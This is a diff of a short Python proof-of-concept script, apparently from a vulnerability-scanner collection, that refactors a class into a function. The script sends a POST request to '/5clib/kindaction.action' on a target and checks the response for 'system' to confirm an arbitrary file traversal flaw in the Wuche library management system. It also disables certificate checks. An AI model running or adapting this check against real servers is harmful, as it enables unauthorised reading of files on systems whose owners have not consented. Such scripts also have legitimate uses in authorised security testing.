@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class clib_kindaction_fileread:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['五车图书管系统kindaction任意文件遍历','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -33,7 +26,7 @@ class clib_kindaction_fileread:
             "toPage":1
         }
         payload = "/5clib/kindaction.action"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"system" in req.text:
@@ -48,5 +41,4 @@ class clib_kindaction_fileread:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = clib_kindaction_fileread(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
